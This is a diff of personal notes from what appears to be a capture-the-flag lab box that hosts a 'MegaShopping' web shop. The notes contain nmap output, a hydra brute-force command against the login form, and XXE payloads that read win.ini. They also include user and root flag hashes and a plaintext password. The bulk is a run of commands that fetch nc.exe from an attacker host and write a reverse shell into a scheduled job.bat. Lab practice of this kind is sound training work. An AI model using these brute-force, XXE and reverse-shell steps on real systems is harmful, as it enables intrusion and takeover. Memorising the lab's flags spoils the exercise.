@@ -1,28 +1,141 @@
-
-
-Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-08 14:34 GMT
-Nmap scan report for 10.129.95.192
-Host is up (0.074s latency).
-Not shown: 997 filtered tcp ports (no-response)
 PORT    STATE SERVICE
 22/tcp  open  ssh
 80/tcp  open  http
 443/tcp open  https
 
-
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-16 10:27 GMT
+Nmap scan report for 10.129.32.90
+Host is up (0.094s latency).
 
 PORT    STATE SERVICE  VERSION
 22/tcp  open  ssh      OpenSSH for_Windows_8.1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 9fa0f78cc6e2a4bd718768823e5db79f (RSA)
+|   256 907d96a96e9e4d4094e7bb55ebb30b97 (ECDSA)
+|_  256 f910eb76d46d4f3e17f393d60b8c4b81 (ED25519)
 80/tcp  open  http     Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
+|_http-title: MegaShopping
 443/tcp open  ssl/http Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
+| ssl-cert: Subject: commonName=localhost
+| Not valid before: 2009-11-10T23:48:47
+|_Not valid after:  2019-11-08T23:48:47
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-title: MegaShopping
 
-admin:password
 
-xml 1.0
-XML external entity
+curl 'http://10.129.32.90/' 
+-X POST 
+-H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0' 
+-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
+-H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' 
+-H 'Content-Type: application/x-www-form-urlencoded'
+-H 'Origin: http://10.129.32.90' 
+-H 'DNT: 1'
+-H 'Connection: keep-alive'
+-H 'Referer: http://10.129.32.90/' 
+-H 'Cookie: PHPSESSID=9druhsienq2uo5oh6l0mtoop3m' 
+-H 'Upgrade-Insecure-Requests: 1' 
+-H 'Sec-GPC: 1' --data-raw
 
-Daniel:
+hydra -l admin -P /usr/share/wordlists/rockyou.txt $target http-post-form '/:username=^USER^&password=^PASS^:Wrong Credentials' -f -V  
 
- -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-GPC: 1' --data-raw 'username=daniel&password=aaaaaa'
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]>
+<order>
+<quantity>
+3
+</quantity>
+<item>
+Home Appliances
+</item>
+<address>aaaaaaaaaaaaa
+</address>
+</order>
 
-hydra -l daniel -P /usr/share/wordlists/rockyou.txt 10.129.95.192 http-post-form "/:username=^USER^&password=^PASS^:Wrong Credentials" -f 
+
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]>
+<order>
+<quantity>
+3
+</quantity>
+<item>
+&test;
+</item>
+<address>
+17th Estate, CA
+</address>
+</order>
+
+
+User.txt
+032d2fc8952a8c24e39c8f0ee9918ef7 
+
+Root.txt
+f574a3e7650cebd8c39784299cb570f8
+
+cd C:
+ls
+cd C:\
+ls
+cd .\Log-Management\
+ls
+more .\job.bat
+wget http://10.10.14.2/nc.exe -o nc.exe 
+ls
+move nc.exe C:\USERS\daniel\nc.exe      
+ls
+echo echo 1 > job.bat
+ls
+cat job.bat
+
+echo wget http://10.10.14.2/nc.exe -o C:\Log-Management\nc.exe & C:\Log-Manageme
+nt\nc.exe -e cmd.exe 10.10.14.2 1234 > C:\Log-Management\job.bat
+
+echo wget http://10.10.14.2/nc.exe -o C:\Log-Management\nc.exe \& C:\Log-Managem
+ent\nc.exe -e cmd.exe 10.10.14.2 1234 > C:\Log-Management\job.bat
+
+echo wget http://10.10.14.2/nc.exe -o C:\Log-Management\nc.exe /& C:\Log-Managem
+ent\nc.exe -e cmd.exe 10.10.14.2 1234 > C:\Log-Management\job.bat
+echo wget http://10.10.14.2/nc.exe -o C:\Log-Management\nc.exe \&\& C:\Log-Manag
+ement\nc.exe -e cmd.exe 10.10.14.2 1234 > C:\Log-Management\job.bat
+echo wget http://10.10.14.2/nc.exe -o C:\Log-Management\nc.exe \n C:\Log-Managem
+ent\nc.exe -e cmd.exe 10.10.14.2 1234 > C:\Log-Management\job.bat
+echo wget http://10.10.14.2/nc.exe -O C:\Log-Management\nc.exe \n C:\Log-Managem
+ent\nc.exe -e cmd.exe 10.10.14.2 1234 > C:\Log-Management\job.bat
+cat .\job.bat
+ls
+nano .\job.bat
+more .\job.bat
+ls -al
+dir
+echo C:\Users\daniel\nc.exe -e cmd.exe 10.10.14.2 1234 > .\job.bat
+echo "C:\Users\daniel\nc.exe -e cmd.exe 10.10.14.2 1234" > .\job.bat
+cat .\job.bat
+wget http://10.10.14.2/nc.exe -o C:\Users\daniel\nc.exe
+ls
+echo "C:\Users\daniel\nc.exe -e cmd.exe 10.10.14.2 1234" > .\job.bat
+wget http://10.10.14.2/nc.exe -o C:\Users\daniel\nc.exe
+ls
+wget http://10.10.14.2/nc.exe -o C:\Users\daniel\nc.exe
+ls
+wget http://10.10.14.2/nc.exe -o C:\Users\daniel\nc.exe
+ls
+wget http://10.10.14.2/nc.exe -o C:\Users\daniel\nc.exe
+$pass = ConvertTo-SecureString "YAkpPzX2V_%" -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential ("daniel",$pass)   
+Start-Process -NoNewWindow -FilePath "C:\xampp\xampp_start.exe" -Credential $cre
+d -WorkingDirectory c:\users\daniel\documents
+exit
